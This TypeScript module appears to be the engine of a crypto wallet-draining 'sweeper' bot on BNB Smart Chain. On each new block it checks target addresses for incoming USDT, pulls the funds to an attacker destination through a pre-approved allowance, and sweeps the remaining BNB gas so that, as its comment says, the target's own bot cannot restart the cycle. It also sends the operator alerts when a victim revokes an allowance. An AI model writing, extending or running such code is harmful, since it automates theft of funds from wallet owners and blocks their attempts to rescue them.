import { webSocket, fallback } from 'viem';
import { createPublicClient } from 'viem';
import { bsc } from 'viem/chains';
import { ENV } from '../config/env';
import { listActive, setAllowanceOk, type Target } from './storage';
import { pull, usdtBalance, allowanceOf } from './puller';
import { sendMax, status, address, txLock, signin, verify, NATIVE } from './baw';
import { notify } from './notify';

const pub = createPublicClient({
  chain: bsc,
  transport: fallback(ENV.WSS_URLS.map(u => webSocket(u))),
});

const cache = new Map<string, Target>();
const inflight = new Set<string>();
const lastFired = new Map<string, number>();
const sessionOk = new Map<string, number>();
const lastUsdt = new Map<string, bigint>();

const COOLDOWN_MS = 1_500;
const MAX_TRIES = 3;

const sref = (t: Target) => ({ dir: `t${t.target}`, instanceId: t.instanceId! });

async function refresh() {
  try {
    const rows = await listActive();
    cache.clear();
    for (const r of rows) cache.set(r.target, r);
    for (const r of rows) {
      if (!lastUsdt.has(r.target)) lastUsdt.set(r.target, await usdtBalance(r.target));
    }
    console.log(`[engine] ${cache.size} active target(s)`);
  } catch (e: any) { console.error('[engine] refresh', e.message); }
}

async function checkAllowance(t: Target) {
  if (!t.puller) return false;
  try {
    const a = await allowanceOf(t.target, t.puller);
    const ok = a > 0n;
    if (ok !== t.allowanceOk) {
      await setAllowanceOk(t.target, ok);
      if (!ok) await notify(t.userId, `⚠️ Allowance gone on \`${t.target}\` — puller can't move USDT. Re-approve.`);
    }
    return ok;
  } catch { return false; }
}

async function tryPull(t: Target) {
  const k = `pull:${t.target}`;
  if (inflight.has(k)) return;
  if (Date.now() - (lastFired.get(k) ?? 0) < COOLDOWN_MS) return;
  if (!t.puller || !t.pullerKey) return;

  inflight.add(k);
  lastFired.set(k, Date.now());
  try {
    for (let i = 1; i <= MAX_TRIES; i++) {
      try {
        await pull(t.pullerKey, t.target, t.destination);
        return;
      } catch (e: any) {
        const m = String(e.message || e);
        console.error(`[pull ${i}] ${t.target}: ${m}`);
        if (m.includes('ALLOWANCE_ZERO')) { await checkAllowance(t); return; }
        if (m.includes('PULLER_LOW_GAS')) {
          await notify(t.userId, `⛽ Puller \`${t.puller}\` is out of BNB. Top it up.`);
          return;
        }
        await new Promise(r => setTimeout(r, 200 * i));
      }
    }
  } finally { inflight.delete(k); }
}

async function sessionLive(t: Target) {
  if (!t.instanceId) return false;
  const last = sessionOk.get(t.target) ?? 0;
  if (Date.now() - last < 10_000) return true;
  try {
    const s = sref(t);
    const [st, ad] = await Promise.all([status(s), address(s)]);
    const hit = ad.data.addresses.find(a => a.binanceChainId === '56');
    if (st.data.status !== 'CONNECTED' || hit?.address.toLowerCase() !== t.target.toLowerCase()) return false;
    sessionOk.set(t.target, Date.now());
    return true;
  } catch { return false; }
}

/** Optional: takes the leftover gas so the bot can't restart the cycle. */
async function bnbLeg(t: Target) {
  if (!ENV.ENABLE_BNB_LEG || !t.isAgentic || !(await sessionLive(t))) return;
  const k = `bnb:${t.target}`;
  if (inflight.has(k)) return;
  inflight.add(k);
  try {
    const { data } = await txLock(sref(t));
    if (data.status === 'LOCKED') return;
    await sendMax(sref(t), NATIVE, t.destination);
    console.log(`[BNB LEG] swept gas from ${t.target}`);
  } catch (e: any) {
    console.error(`[bnb leg] ${t.target}: ${String(e.stdout || e.message).slice(0, 140)}`);
  } finally { inflight.delete(k); }
}

async function scan(t: Target) {
  const bal = await usdtBalance(t.target);
  const prev = lastUsdt.get(t.target) ?? 0n;
  lastUsdt.set(t.target, bal);

  if (bal > 0n && bal > prev) {
    console.log(`[ARRIVAL] ${t.target} +USDT`);
    await tryPull(t);
    setTimeout(() => { void bnbLeg(t); }, 1_200);
  }
}

export async function startEngine() {
  await refresh();
  setInterval(refresh, 4_000);
  setInterval(() => { for (const t of cache.values()) void checkAllowance(t); }, 300_000);

  let chain: Promise<unknown> = Promise.resolve();
  pub.watchBlocks({
    onBlock: () => {
      chain = chain
        .then(() => Promise.allSettled([...cache.values()].map(t => scan(t))))
        .catch(e => console.error('[cycle]', e.message));
    },
  });
  console.log('[engine] armed — puller mode, USDT primary');
}

export { signin, verify };
